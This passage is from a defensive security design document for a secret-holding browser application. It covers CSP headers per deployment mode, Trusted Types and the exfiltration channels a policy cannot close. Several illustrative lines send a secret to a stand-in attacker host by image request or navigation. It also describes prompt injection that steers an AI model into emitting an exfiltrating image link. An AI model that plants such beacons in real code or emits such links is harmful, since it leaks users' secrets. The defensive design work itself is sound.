# 34 — Defending a browser application that holds secrets

> **Status:** Proposed

Companion to `31-threat-model.md`, which owns the threat model and the out-of-scope list, and to
`32-cryptography.md`, which owns the envelope, the key hierarchy and memory hygiene. This document
owns the browser platform: the policy headers, the storage decision, the rendering rules, the
clipboard, the worker topology, and the artifact fork that the offline build actually is.

**The governing rule of this document, stated once, in caps, at the top:**

> **NONE OF THIS DEFENDS A BROWSER THAT HAS ALREADY BEEN TAKEN. IT MAKES OUR OWN BUGS SMALLER AND
> THE ATTACKS WE CAN SEE MORE EXPENSIVE.**

`31` §6.2 completed the owner's truncated sentence: *defensive code runs in the same context as the
attacker.* That is not a preamble to be got past before the real content starts. It is the
constraint that determines what every control below is allowed to claim. A control that only works
when the attacker is polite is not a control, and this document is written to keep from shipping
any.

---

## 0. Contents

| § | Section | |
|---|---|---|
| 1 | What this is for, given that the browser is out of scope | *read this first* |
| 2 | Content Security Policy, per deployment mode | *the literal headers* |
| 3 | The single-file offline build is a CSP problem | **DECISION** |
| 4 | Storage — where ciphertext lives and what evicts it | *the browser can delete your work* |
| 5 | XSS in an application whose job is rendering untrusted text | *the core surface* |
| 6 | The clipboard is a primary interface | *not an afterthought* |
| 7 | Subresource integrity, workers, and WASM | *what a worker bounds* |
| 8 | Third-party isolation — the zero target and its honest asterisk | |
| 9 | Framing, tabnabbing, `window.opener`, `postMessage` | |
| 10 | The hardening checklist, with the test for each item | *work through this* |
| 11 | Residual risk | |
| 12 | Sources | |
| 13 | Disagreements and proposed changes | |

---

## 1. What this is for, given that the browser is out of scope

### 1.1 The concession, restated without softening

From `31` §6.2, and nothing below contradicts it:

> If hostile code executes in the Fathom origin, it reads the decrypted graph out of WASM linear
> memory as a plain `Uint8Array`, calls any exported core function with any arguments, reads the
> passphrase from the input element before we ever see it, rewrites the DOM so the user sees a lock
> that means nothing, and rewrites any integrity check we wrote — because that check is a function
> it can replace.

A malicious extension with host permissions reaches the same position for the price of one store
listing and one click (`31` §3.3). Against either of those, everything in this document is theatre.

So this document does not claim to defend the browser. It has three jobs, and they are smaller and
more defensible than that.

### 1.2 The three jobs

| # | Job | What it actually is | How you would know it worked |
|---|---|---|---|
| **J1** | **Bound the blast radius of a bug in our own code** | Fathom will have an XSS, a parser bug, a renderer that concatenates a string it should not have. The question is not whether, it is what happens next. Every control here is chosen for what it does *after* our bug, not for whether it prevents one | A known-injectable build, under the shipped policy, cannot get a byte off the machine through a channel the policy covers |
| **J2** | **Raise the cost of the attacks that are in scope** | `31` §5's rows 15 (malicious pasted configuration), 16 (cross-origin attack on the served build), and the corpus/pack rows 11 and 12. These are real, they are cheap, and they are the ones a policy header genuinely stops | The fuzz corpus produces no panic and no unbounded allocation; a hostile rule pack's prose cannot become markup |
| **J3** | **Make the no-egress claim checkable by a stranger** | `31` §5.3's verification checklist is the deliverable of the security posture. Half of it is reading this document's headers out of the shipped artifact | An enterprise reviewer with `curl -I` and DevTools confirms items 1, 2, 3 and 7 without our help |

J3 is worth stating separately because it is the one people forget is a security property.
`connect-src 'none'` is not primarily a runtime control — an attacker with code execution has other
ways out (§2.11). It is primarily an **auditable statement in the artifact** that a reviewer can
check in ten seconds and that CI can enforce on every build. That is why invariant 1 is written as
a policy directive rather than as a code-review rule.

### 1.3 The bug classes this actually defends against

Be concrete about what J1 means. These are the defects an implementer will plausibly ship, and what
each control does to them:

| Our bug | Without the controls here | With them |
|---|---|---|
| A description field rendered with `innerHTML` | Stored XSS from any parsed configuration. Full origin compromise on open | `require-trusted-types-for 'script'` turns the assignment into a `TypeError` at the sink. The lint (§5.8) turns it into a failed build before that |
| An emitter that interpolates a device name into an HTML string | Same | Same. And §5.2 R10 means the renderer never accepts a string it did not build |
| A parser that loops on a malformed `display set` capture | The tab freezes and the user loses unsaved work | The parse worker misses its deadline and is terminated. The main thread was never blocked (§7.3) |
| A parser that allocates without bound on a nested block | `memory.grow` fails or the tab is killed by the OS | The parse worker's linear memory is capped at instantiation, the allocation traps, the worker is discarded, and the failure surfaces as a named error rather than as a crash (§7.4) |
| A diagram exporter that writes an SVG containing content-derived markup | An SVG on disk carrying script, opened later in a browser | The SVG is built through `createElementNS` from a closed element allowlist (§5.7) |
| A "copy all" that helpfully appends a trailing newline | The command auto-executes when pasted into a terminal | §6.3 C6: nothing we copy ever ends in a newline |
| A `sources:` string from a rule pack rendered as an anchor | `23` §6.3's exfiltration-by-link channel, from a signed pack whose author we bound but whose prose we did not | §9.4: the application renders no clickable external link, ever |

### 1.4 What this document does not own

| Not here | Owned by |
|---|---|
| The threat model, actor register, residual scale, out-of-scope list | `31` |
| Envelope format, KDF, AEAD, key hierarchy, memory zeroing, `lock()` | `32` |
| Workspace on-disk layout, records, frames, git, export gates | `10-core/17` |
| AI-layer tiers, egress consent, redaction, the localhost sidecar decision | `20-ai/21`, `20-ai/24` |
| Prompt injection and the exfiltration-channel catalogue C1–C9 | `20-ai/23` |
| The corpus markdown subset and its build-time compilation to an AST | `10-core/15` §6.4 |
| Rule-pack signing and the trust store | `10-core/12` §13 |
| Release signing, reproducible builds, image publication | `70-ops/` |

Where this document restates something from those, it is because an implementer working through the
checklist in §10 needs it in front of them. Where it *changes* something, it is marked
**PROPOSED CHANGE** and repeated in §13.

### 1.5 The two audiences, and why they pull in opposite directions

Every control here is read by two people. The attacker reads it to find the gap. The enterprise
reviewer reads it to decide whether to allow the tool. Writing for the second while pretending the
first cannot read it produces the security-marketing register the conventions ban.

The resolution used throughout: **state the gap next to the control.** A reviewer who finds a gap we
already named trusts the rest of the document. A reviewer who finds a gap we hid stops reading, and
they are right to.

---

## 2. Content Security Policy, per deployment mode

### 2.1 The modes

`31` §1.1 names four deployment shapes. Three of them are browsers, and they get materially
different policies because they have materially different capabilities:

| Mode | Artifact | Delivery of policy | Origin | AI tier (`21` §7) |
|---|---|---|---|---|
| **A — reference artifact** | one `.html`, everything inlined, opened from disk | `<meta http-equiv>` only | opaque (`file://`) | 0 |
| **B — offline workspace** | static bundle served from loopback by `fathom serve` | response headers | `http://127.0.0.1:7440` | 0, 2a, 2b |
| **C — self-hosted with sync** | same bundle, plus the Axum service, one host | response headers | one `https://` origin | 0, 1, 2 |
| **D — enterprise** | same code, load-balanced, operator-configured | response headers | one `https://` origin | 0, 1, 2, 3 |
| **E — CLI** | native Rust binary | *n/a — no browser* | *n/a* | 0, 2b |

§3 explains why mode A and mode B are two artifacts rather than one, and what mode A is allowed to
hold. Read §3 before implementing §2.2's mode A policy, because the policy makes sense only once you
know that artifact holds no ciphertext.

### 2.2 The literal policies

**Mode A — reference artifact, `file://`.** Delivered in `<head>`, because that is the only channel
available. Four directives are silently discarded here (§2.8) and the policy is written to make that
loss legible rather than to hide it.

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'sha256-REPLACED_AT_BUILD' 'wasm-unsafe-eval';
  style-src 'sha256-REPLACED_AT_BUILD';
  img-src data:;
  font-src data:;
  connect-src 'none';
  worker-src blob:;
  child-src 'none';
  frame-src 'none';
  form-action 'none';
  base-uri 'none';
  object-src 'none';
  media-src 'none';
  manifest-src 'none';
  require-trusted-types-for 'script';
  trusted-types fathom-dom fathom-worker;
">
<meta name="referrer" content="no-referrer">
```

**PROPOSED CHANGE to `21` §7.5:** that section gives the single-file policy as `img-src 'self'
data:` and `font-src 'self' data:`. Under an opaque origin, `'self'` matches nothing. Keeping it
there costs nothing operationally and costs something in review: it reads as a grant, and a reviewer
who works out that it is inert wonders what else in the policy is decoration. Drop it in mode A,
keep it in modes B–D.

**Mode B — offline workspace, loopback.** Real headers, which is the entire point of §3's decision.

```http
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'wasm-unsafe-eval';
  style-src 'self';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  worker-src 'self';
  child-src 'none';
  frame-src 'none';
  frame-ancestors 'none';
  form-action 'none';
  base-uri 'none';
  object-src 'none';
  media-src 'none';
  manifest-src 'self';
  require-trusted-types-for 'script';
  trusted-types fathom-dom fathom-worker;
  sandbox allow-scripts allow-same-origin allow-downloads
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
Integrity-Policy: blocked-destinations=(script style)
Permissions-Policy: accelerometer=(), autoplay=(), bluetooth=(), camera=(),
  clipboard-read=(), display-capture=(), geolocation=(), gyroscope=(),
  hid=(), idle-detection=(), local-fonts=(), magnetometer=(), microphone=(),
  midi=(), payment=(), publickey-credentials-get=(), screen-wake-lock=(),
  serial=(), usb=(), xr-spatial-tracking=()
Cache-Control: no-store
```

`connect-src 'self'` in mode B is not a hole. The only same-origin endpoint `fathom serve` exposes
is the static bundle itself; there is no API, no upload path, no sync. A reviewer can confirm this
by fetching every path the server will answer, and §3.7 specifies that the server answers only from
a fixed manifest of built files.

**Mode C — self-hosted with sync.** The one change that matters is that `connect-src 'self'` now
means something: it is the sync origin, and it is the same origin as the application.

```http
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'wasm-unsafe-eval';
  style-src 'self';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  worker-src 'self';
  child-src 'none';
  frame-src 'none';
  frame-ancestors 'none';
  form-action 'none';
  base-uri 'none';
  object-src 'none';
  media-src 'none';
  manifest-src 'self';
  require-trusted-types-for 'script';
  trusted-types fathom-dom fathom-worker;
  sandbox allow-scripts allow-same-origin allow-downloads;
  report-to csp
Reporting-Endpoints: csp="https://fathom.example.net/_csp"
Strict-Transport-Security: max-age=63072000; includeSubDomains
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
Integrity-Policy: blocked-destinations=(script style)
Permissions-Policy: <as mode B>
```

**The reporting endpoint is same-origin and it is a decision, not a default.** A CSP report contains
the blocked URI and a fragment of the offending content. Sending that to a third-party report
collector would put a second origin in the trust set and would hand a stranger fragments of a
network configuration. If the operator does not want a reporting endpoint, drop `report-to` and the
`Reporting-Endpoints` header; nothing else changes. Never point it off-origin.

**Mode D — enterprise.** Mode C plus at most one inference origin, and only at tiers 1 and 3:

```http
Content-Security-Policy:
  ...
  connect-src 'self' https://inference.corp.example;
  ...
```

Three things about that line:

1. `connect-src` and `img-src` are separate directives. Adding the inference origin to `connect-src`
   does **not** let an image load from it, which is `23` §6.2's C2 channel and the reason `img-src`
   is not `*` and never will be.
2. The origin set is fixed at build time (`21` §7.5). There is no settings screen that adds an
   origin, because a security claim a settings screen can revoke is not a claim about the artifact.
3. At tiers 0 and 2a, mode D's `connect-src` is `'self'` and the enterprise deployment is
   indistinguishable from mode C.

### 2.3 Every directive, and why

Ordered as written in the policy, because an implementer reads it top to bottom.

| Directive | Value | Why exactly this |
|---|---|---|
| `default-src` | `'none'` | The whitelist discipline. Every fetch type not named below is denied, including ones that do not exist yet. A policy built from `default-src 'self'` grants tomorrow's directive by default, and CSP has gained directives repeatedly |
| `script-src` | hash (A) / `'self'` (B–D), plus `'wasm-unsafe-eval'` | §2.5, §2.6. No `'unsafe-inline'`, no `'unsafe-eval'`, no `'unsafe-hashes'`, no `'strict-dynamic'`, no nonce |
| `style-src` | hash (A) / `'self'` (B–D) | CSS injection is real but bounded: no `expression()` in any current engine, and no `url()` egress because `default-src 'none'` denies the fetch. The reason to keep it tight is exfiltration by attribute-selector CSS, which needs `img-src`/`font-src` to be loose to work — and they are not |
| `img-src` | `data:` (A) / `'self' data:` (B–D) | §2.7. This is the single most abused exfiltration channel in the class of application Fathom is |
| `font-src` | `data:` (A) / `'self'` (B–D) | Same channel as `img-src`, and the design language names two specific families (§8.4). Never a font host |
| `connect-src` | `'none'` (A, B at tier 0) / `'self'` / `'self' <one origin>` | Invariant 1. §2.4 |
| `worker-src` | `blob:` (A) / `'self'` (B–D) | §7.2. Mode A has no separate script URL to point at, so a worker can only come from a blob. This is a real loosening and §2.11 prices it |
| `child-src`, `frame-src` | `'none'` | We embed nothing. Ever. §9.3 |
| `frame-ancestors` | `'none'` (B–D) | Nobody embeds us. **Discarded in mode A** — §2.8 |
| `form-action` | `'none'` | The application submits no form. This closes `23` §6.3's form-post exfiltration variant, which `connect-src` does not cover because a form submission is a navigation, not a fetch |
| `base-uri` | `'none'` | Stops an injected `<base>` retargeting every relative URL in the document. Cheap, and it closes a bypass that survives a tight `script-src 'self'` |
| `object-src` | `'none'` | Plugin content is a legacy script sink. `default-src 'none'` already covers it; it is written out because a future editor who loosens `default-src` should have to delete this line deliberately |
| `media-src`, `manifest-src` | `'none'` / `'self'` | No audio, no video. The manifest exists only in modes B–D for the installable shell |
| `require-trusted-types-for` | `'script'` | §2.9 |
| `trusted-types` | `fathom-dom fathom-worker` | Two named policies and no `'allow-duplicates'`, so a second `createPolicy('fathom-dom', …)` throws. Notably **not** `default` — §2.9 |
| `sandbox` | `allow-scripts allow-same-origin allow-downloads` | §2.11. This is the only mechanism that closes top-level navigation and `window.open` as egress channels. **Discarded in mode A** |
| `report-to` | `csp` (C–D, optional) | §2.2. Same-origin only. **Discarded in mode A** |

Directives deliberately **absent**:

| Absent | Why |
|---|---|
| `'strict-dynamic'` | It exists to let a trusted loader pull in scripts a policy cannot enumerate. We have one bundle and no loader. Adding it would let an injected `document.createElement('script')` inherit trust — the exact thing we are trying to prevent |
| A nonce | A nonce is the right tool when markup is generated per response. Ours is static and hashable. A nonce also requires a per-response value, which a cacheable static bundle cannot have without disabling caching |
| `upgrade-insecure-requests` | There are no insecure requests to upgrade. Its presence would imply there might be |
| `block-all-mixed-content` | Deprecated, and same argument |
| `prefetch-src` | Not universally implemented, and `default-src 'none'` covers the fetches it would govern. <!-- VERIFY: confirm current implementation status of prefetch-src across Chromium, Firefox and WebKit before relying on default-src to cover speculative loads. --> |

### 2.4 `connect-src 'none'` versus one origin

This is the directive the whole security posture is quoted on, so it deserves the difference spelled
out rather than a table cell.

| | `'none'` (modes A, B) | `'self'` (mode C) | `'self' <one origin>` (mode D, tiers 1/3) |
|---|---|---|---|
| `fetch`, `XMLHttpRequest` | blocked | same origin only | same origin, plus the one inference origin |
| `WebSocket`, `EventSource` | blocked | same origin only | same origin only in practice — the inference transport is HTTP |
| `navigator.sendBeacon` | blocked | same origin | same origin |
| WebRTC | Governed by `webrtc` in CSP3, not by `connect-src`, and support is uneven. We do not use it and CI asserts the string `RTCPeerConnection` does not appear in the bundle <!-- VERIFY: current implementation status of the `webrtc` directive in Chromium, Firefox and WebKit. --> | same | same |
| What a reviewer sees | "This cannot reach the network" — checkable in one line | "This can only reach the host it came from" | "This can reach exactly one named third party, published in the release notes" |

**The claim `'none'` supports, precisely:** no script in this document can *originate a request* to
any host through any fetch-type API. It does not say the document cannot cause data to leave the
machine — §2.11 lists three ways it still can, and two of them are only closed by the `sandbox`
directive, which mode A cannot deliver.

**The claim `'self'` supports:** the same, except that requests to the origin the document came from
are permitted, and in mode C that origin is the zero-knowledge sync service which receives ciphertext
by design (`31` §5.1 rows 1–3). The step from `'none'` to `'self'` is therefore not a weakening of
the confidentiality claim; it is the introduction of the metadata channel that `31` §7 already
prices.

**The step to a named third-party origin at tier 1 is different in kind, and `21` §8.7 says so.**
This document does not soften it: at tier 1, a redacted projection of the graph leaves the machine
in the clear at the provider, and no header in §2.2 changes that.

### 2.5 `script-src`: hashes, and what we refuse

**Mode A** ships one inline `<script>` containing the whole bundle, pinned by SHA-256. This is worth
naming for what it is: **the CSP hash is subresource integrity for inline script.** The browser
computes the digest of the element's text content and refuses to execute if it differs by one byte.
A tampered single file does not run — it fails visibly, at load, with a console violation. That is a
stronger integrity property than mode B gets from `'self'` alone, and it is the one genuine security
advantage the single-file artifact has (§7.1).

**Modes B–D** ship hashed-filename assets under `'self'`, with `Integrity-Policy:
blocked-destinations=(script style)` so that a `<script>` without an `integrity` attribute is
refused rather than merely unhashed. `'self'` alone would permit any same-origin path to be a script
source; the integrity policy converts that into "any same-origin path whose bytes match the digest
in the markup". <!-- VERIFY: Integrity-Policy is comparatively new and support is not uniform. Confirm current Chromium/Firefox/WebKit status; where unsupported, the header is ignored and the residual is `'self'` alone, which is the state to assume in the review pack. -->

Refused, with reasons:

| Refused | Why |
|---|---|
| `'unsafe-inline'` | The whole point. An injected `<script>` executes |
| `'unsafe-eval'` | `eval`, `new Function`, `setTimeout("…")`, `setInterval("…")`. We have no template engine, no expression evaluator and no dynamic dispatch that needs it. The rule engine's condition language is compiled in Rust and is deliberately not Turing-complete (`12` §3.3) |
| `'unsafe-hashes'` | It exists to hash inline event handlers (`onclick="…"`). We have zero. Every listener is `addEventListener` on an element the code created |
| `'wasm-eval'` | A Chromium-only spelling that predates the standard keyword. Use `'wasm-unsafe-eval'` <!-- VERIFY: whether any target browser still requires the legacy `'wasm-eval'` spelling; if one does, both keywords go in the policy and the reason is recorded here. --> |
| `blob:` in `script-src` | A blob URL is a script the page constructed at runtime, which is exactly the capability `'unsafe-eval'` grants by another route. Mode A needs `blob:` in **`worker-src`** and that is a different and much narrower grant (§7.2) |

### 2.6 `'wasm-unsafe-eval'` — exactly what it permits

The Rust core compiles to WebAssembly, and under any policy that sets `script-src` or `default-src`,
instantiating a WebAssembly module is blocked unless the policy says otherwise. Before the keyword
existed the only way to do it was `'unsafe-eval'`, which is a catastrophic grant. `'wasm-unsafe-eval'`
was introduced to split the two.

| Permits | Does not permit |
|---|---|
| `WebAssembly.compile()` | `eval()` |
| `WebAssembly.instantiate()` | `new Function()` |
| `WebAssembly.compileStreaming()` | `setTimeout` / `setInterval` with a string body |
| `WebAssembly.instantiateStreaming()` | `<script>` from a source not permitted by `script-src` |
| `new WebAssembly.Module(bytes)` | any JavaScript source text becoming code |

**What it means for an attacker who already has script execution in our origin.** They can compile
and instantiate their own WebAssembly module. That is worth stating plainly because it sounds worse
than it is: a WebAssembly instance has **no ambient authority**. It has no syscalls, no network, no
DOM, no storage. Everything it can touch, it touches through imports that the *calling JavaScript*
supplies. So the grant hands an attacker a fast, awkward-to-read compute engine and not one
capability they did not already have from JavaScript.

**What it does cost, honestly:** obfuscation. Malicious WASM is materially harder to spot in a review
of a tampered artifact than malicious JavaScript. That cost lands on `31` §5.1 rows 7 and 9 — the
reproducible-build rows — not on the runtime policy, and the mitigation is reproducibility, not a
CSP keyword.

**We cannot avoid the keyword.** The core is the product. There is no version of Fathom whose graph,
rules, emitters and parsers run in JavaScript, and pretending otherwise to get a cleaner policy would
trade a real memory-safety property (`31` §4.3) for a cosmetic one.

### 2.7 `img-src` and exfiltration by image request

A CSP that leaves `img-src` open leaves egress open, because an image request is a fully attacker-
controlled GET with attacker-chosen path and query, and it needs no response to succeed.

```js
// The entire attack. No fetch, no XHR, no form, no navigation.
new Image().src = 'https://attacker.example/x?d=' + encodeURIComponent(secret);
```

`connect-src 'none'` does nothing about this. The directives are independent by design, and that
independence is the trap. `23` §6.2 catalogues this as channel C2 in the AI-layer context — the
model is steered into emitting `![](https://attacker/?d=…)` and the renderer fetches it — but the
channel exists without any AI layer at all. A device `description` field containing an image URL, a
rule pack's prose, a corpus entry: all of them reach a renderer, and any renderer that emits an
`<img>` with a content-derived `src` is an exfiltration primitive.

**Three defences, layered, because one of them will be wrong at some point:**

| Layer | Control | What it stops on its own |
|---|---|---|
| 1 | `img-src data:` (mode A) / `'self' data:` (B–D) | The request never leaves. Even a perfect injection into an `<img src>` fails at the network layer |
| 2 | The corpus markdown subset forbids images entirely (`15` §6.4) | There is no authored path that produces an `<img>` |
| 3 | §5.2 R5 — no URL from any untrusted source becomes an `src`, `href`, `srcset`, `poster` or `data` value | There is no code path that produces an `<img>` with content-derived attributes |

`data:` is retained in `img-src` because the diagram export and the risk legend need inline SVG data
URIs, and a `data:` URI cannot reach a host. `'self'` is retained in modes B–D for the small set of
built assets. Neither is a channel.

**The same argument applies to `font-src`.** A CSS `@font-face` with a remote `src` is the same GET
with the same query string and it is easier to overlook because nobody thinks of a font as a request.
This is one of two reasons the design language's two font families are self-hosted or inlined rather
than linked (§8.4); the other is invariant 1.

### 2.8 The directives `<meta>` throws away — and what that costs mode A

CSP is explicit that four directives are removed from the policy when it is parsed from a `<meta>`
element: `report-uri`, `frame-ancestors`, `sandbox`, and the obsolete `reflected-xss`. Browsers are
encouraged to warn, which means the failure is silent to anyone not watching the console.

`31` §5.1 row 16 already records the `frame-ancestors` half of this as a `material` residual in the
single-file build. It is worse than that row states, because `sandbox` is the directive that closes
the last two egress channels (§2.11).

| Lost in mode A | Consequence | Compensating position |
|---|---|---|
| `frame-ancestors 'none'` | No CSP-level clickjacking control. `X-Frame-Options` is a header and is equally unavailable | An `https://` page cannot frame a `file://` document, so the practical exposure is another local document. A framebusting script is *not* the answer — §9.2 |
| `sandbox` | Top-level navigation and `window.open` remain available as egress channels to any script in the origin | **Mode A holds no secrets.** §3's decision exists substantially because of this row |
| `report-to` / `report-uri` | No violation reporting. A policy violation in a user's mode A session is invisible to everyone including the user | Mode B–D report; mode A's violations surface in the console only |
| `reflected-xss` | Obsolete; no loss | — |

**This table is the argument of §3 in miniature.** The artifact whose policy cannot be fully
delivered is the artifact that must not hold anything worth stealing.

### 2.9 Trusted Types, and what adopting it costs

`require-trusted-types-for 'script'` makes the DOM's injection sinks reject plain strings. Assigning
a string to `innerHTML` becomes a `TypeError` instead of a parse. `trusted-types fathom-dom
fathom-worker` restricts policy creation to those two names.

This is the one control in the document that is a genuine *structural* defence rather than a
network-layer one: it converts "we must remember never to write to a sink" into "writing to a sink
throws unless it goes through a named, reviewable factory". `31` §5.1 row 15 lists it among the
mitigations for hostile pasted configuration and this section is what that entry means.

**The cost, in the general case, is large.** Every DOM-manipulating library must be Trusted Types
aware or it breaks at the first sink. Sanitiser integration, templating engines, chart libraries and
anything that ships `innerHTML` all need adapting, and the usual adoption path is a long
`Content-Security-Policy-Report-Only` campaign with a permissive `default` policy in place.

**The cost for Fathom is close to zero, and the reason is worth noticing.** Three earlier decisions
collapse it:

| Decision | Made in | Effect on Trusted Types adoption |
|---|---|---|
| Zero third-party runtime JavaScript | §8 of this document | Nothing in the bundle needs adapting except our own code |
| The corpus markdown subset forbids raw HTML and is compiled to an AST at build time; no markdown parser runs on the client | `15` §6.4 | The one place a real application would need an HTML sanitiser does not exist |
| Emitters return `(line, provenance)` pairs, never strings | invariant 6 | Config output is structured data all the way to the renderer, so there is no string to inject |

So the policy we create is a policy that refuses to create HTML:

```ts
// One module. Imported for side effect, first, before any DOM code runs.
const WORKER_URLS = new Set([
  '/w/parse.js', '/w/crypto.js', '/w/engine.js',   // build-time constants, mode B–D
]);

export const dom = trustedTypes!.createPolicy('fathom-dom', {
  createHTML(): string {
    throw new TypeError('fathom-dom does not create HTML. Build nodes, not markup. (34 §5.2 R1)');
  },
  createScript(): string {
    throw new TypeError('fathom-dom does not create script.');
  },
  createScriptURL(url: string): string {
    if (WORKER_URLS.has(url)) return url;
    throw new TypeError(`fathom-dom refused a script URL: ${url}`);
  },
});
```

A policy whose `createHTML` always throws is not a workaround. It is the design stated in executable
form: **there is no supported way to turn a string into markup in this application**, and the sink is
where that is enforced rather than where it is documented.

**Four costs that are real even here:**

1. **`trusted-types default` must never be created.** A default policy is the escape hatch that makes
   every sink work again, silently, everywhere. It is not in the allowlist, so creating it throws —
   which is the point of naming policies rather than allowing any.
2. **Worker construction becomes a `TrustedScriptURL` sink.** `new Worker(url)` and `importScripts`
   go through `fathom-worker`. That is why there are two policies: the DOM policy has no legitimate
   script-URL business, and splitting them means a compromised call site cannot borrow the other's
   capability without naming it.
3. **Report-only first, in modes B–D.** Ship `Content-Security-Policy-Report-Only:
   require-trusted-types-for 'script'` one release ahead of enforcement, watch the endpoint, then
   enforce. Mode A cannot report (§2.8), so mode A gets enforcement from day one and its violations
   are found in mode B's testing.
4. **Browser support.** Chromium has shipped it for years; WebKit and Gecko arrived much later and
   the feature is described as reaching Baseline in early 2026. <!-- VERIFY: confirm Trusted Types availability in the exact browser/version matrix we support before the checklist item H14 in §10 is treated as enforced everywhere. Where unsupported, the directive is ignored and §5's lint is the only control — which is why the lint is a separate checklist item and not a comment. -->
   Where the browser ignores the directive, the static lint (§5.8) is the whole defence, and that is
   the state to assume in the review pack.

### 2.10 The headers that are not CSP

| Header | Value | What it buys | Available in mode A? |
|---|---|---|---|
| `Cross-Origin-Opener-Policy` | `same-origin` | Severs `window.opener` in both directions, so a page that opened us cannot reach our window and vice versa. Also half of cross-origin isolation. §9.5 | no |
| `Cross-Origin-Embedder-Policy` | `require-corp` | The other half of cross-origin isolation, which is what `SharedArrayBuffer` and WASM threads require (`32` §20). We do not use threads today; setting it now means we are not blocked from it later, and it costs nothing because every subresource is same-origin | no |
| `Cross-Origin-Resource-Policy` | `same-origin` | Our assets cannot be loaded by another origin at all — including as an image or a script — which removes a class of cross-origin read side channels | no |
| `X-Content-Type-Options` | `nosniff` | Stops MIME sniffing turning a served file into a script. With a fixed asset manifest this is belt and braces; it is one header | no |
| `X-Frame-Options` | `DENY` | Redundant with `frame-ancestors` where CSP3 is honoured, and not redundant anywhere it is not. §9.2 | no |
| `Referrer-Policy` | `no-referrer` | We render no external links (§9.4), so this covers the case where someone adds one. In mode A the `<meta name="referrer">` equivalent works | yes, via `<meta>` |
| `Integrity-Policy` | `blocked-destinations=(script style)` | §2.5, §7.1 | no |
| `Permissions-Policy` | everything denied | Removes camera, microphone, geolocation, serial, HID, USB, display capture and `clipboard-read` from the document's reach. Fathom needs none of them. `clipboard-read` is denied deliberately: §6.6 reads pasted content from the `paste` event, which does not require the permission | no |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains` | Modes C–D only. Loopback is not TLS and does not need it | no |
| `Cache-Control` | `no-store` on the document and on any sync response; hashed immutable filenames for assets | Keeps the shell out of intermediary caches and keeps ciphertext out of the disk cache | no |
| `Clear-Site-Data` | `"cache", "storage"` on explicit sign-out, modes C–D | The only reliable way to ask the browser to drop our storage. §4.7 | no |

Ten of eleven unavailable in mode A. This is the same argument as §2.8 arriving from a different
direction.

### 2.11 What the CSP does not stop

The honest list. Every item is a channel that survives the strictest policy in §2.2.

| # | Channel | Why CSP does not cover it | Closed by |
|---|---|---|---|
| 1 | **Top-level navigation with data in the URL** — `location = 'https://attacker/?d=' + secret` | CSP governs *fetches*. A navigation is not a fetch. The proposed `navigate-to` directive was not shipped | `sandbox` without `allow-top-navigation` — **modes B–D only** |
| 2 | **`window.open` to an attacker origin** | Same reason. A popup is a top-level navigation in a new context | `sandbox` without `allow-popups` — **modes B–D only** |
| 3 | **A browser extension** | Extension requests are subject to the extension's policy, not ours (`31` §6.2) | nothing |
| 4 | **DevTools, or an extension with the `debugger` permission** | Outside the page's policy by design | nothing |
| 5 | **The user, copying and pasting** | It is the product's output mechanism (invariant 2, `31` §6.5) | nothing — §6 makes it legible instead |
| 6 | **A tampered build** | The policy is *in* the artifact. An attacker who can change the artifact changes the policy first | Reproducible builds and signature checking (`31` rows 7, 9) |
| 7 | **Reading** | CSP constrains loading and execution, not computation. An XSS reads the entire decrypted graph regardless; the policy only makes sending it hard | nothing |
| 8 | **Timing and cache side channels** | Not in CSP's model | nothing, and not attempted |

Items 1 and 2 are the reason the `sandbox` directive appears in modes B–D. It is unusual to sandbox
a top-level document with `allow-same-origin`, and the objection people raise — *"`allow-scripts`
plus `allow-same-origin` lets the content remove its own sandbox"* — applies to the `sandbox`
**attribute** on an iframe, where the framed document can reach up and rewrite the attribute. A
header-delivered sandbox on a top-level document has no attribute to rewrite.

<!-- VERIFY: confirm in Chromium, Firefox and WebKit that (a) a header-delivered `CSP: sandbox` on a
top-level document is enforced and cannot be lifted by same-origin script, (b) omitting
`allow-top-navigation` blocks `location` assignment from the document itself and not only from
frames, (c) `showSaveFilePicker` and the download fallback both still work with `allow-downloads`
and without `allow-popups`, and (d) OPFS, IndexedDB and `crypto.subtle` remain available under
`allow-same-origin`. If (c) or (d) fails, the sandbox directive is dropped and channels 1 and 2 move
to the residual register in §11 as `material` in every mode. -->

If that verification holds, modes B–D close channels 1 and 2 and mode A does not — which is the
third independent argument for §3's decision, and the three arguments are not the same argument
wearing different clothes.

---

## 3. The single-file offline build is a CSP problem

### 3.1 What a degenerate origin actually means

"`file://` has an opaque origin" is repeated often enough to become noise. The consequences, listed:

| Property | Under `https://host` | Under `file://` |
|---|---|---|
| Origin | `scheme://host:port`, stable | opaque, and in current browsers unique per document |
| Same-origin policy | meaningful | every document is cross-origin to every other, including two files in the same directory |
| Secure context | yes | **yes** — `file://` is treated as potentially trustworthy, so `crypto.subtle` is available |
| Origin-keyed storage (IndexedDB, `localStorage`, Cache API) | available | keyed to an origin that does not exist. IndexedDB is blocked; `localStorage` behaviour varies by browser and version <!-- VERIFY: current per-browser behaviour of IndexedDB, localStorage, Cache API and OPFS under file:// in Chromium, Firefox and WebKit. `24` §2.2 and `32` §13.1 flag the same question and all three documents should be updated from one measurement. --> |
| OPFS | available | uncertain, and depends on the same origin keying <!-- VERIFY: as above --> |
| Response headers | ours to set | **none exist** — there is no response |
| `<meta>` CSP | works, minus four directives | works, minus four directives (§2.8) |
| Workers | from a same-origin script URL | uncertain; a `blob:` worker may or may not be constructible <!-- VERIFY: `32` §4.5 already flags this and it is the same measurement. --> |
| Cross-origin isolation (`SharedArrayBuffer`, WASM threads) | with COOP+COEP headers | impossible — no headers |
| Being framed | governed by `frame-ancestors` | not governed; practically, an `https://` page cannot frame a `file://` document |
| Update path | serve a new build | the user downloads a new file and remembers to |

The through-line: **`file://` gives you a secure context and takes away every mechanism that makes
that secure context defensible.** You can do the cryptography. You cannot state a policy about it,
